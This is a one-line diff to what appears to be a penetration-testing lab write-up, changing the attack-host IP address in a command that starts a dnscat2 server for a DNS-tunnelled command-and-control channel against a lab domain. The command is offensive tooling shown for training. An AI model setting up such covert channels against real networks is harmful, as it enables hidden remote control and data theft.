@@ -194,7 +194,7 @@ server/dnscat2.rb
 From the attack host:
 
 ```bash
-sudo ruby dnscat2.rb --dns host=10.10.14.19,port=53,domain=inlanefreight.local --no-cache
+sudo ruby dnscat2.rb --dns host=10.10.15.19,port=53,domain=inlanefreight.local --no-cache
 ```
 
 Let's break this down.
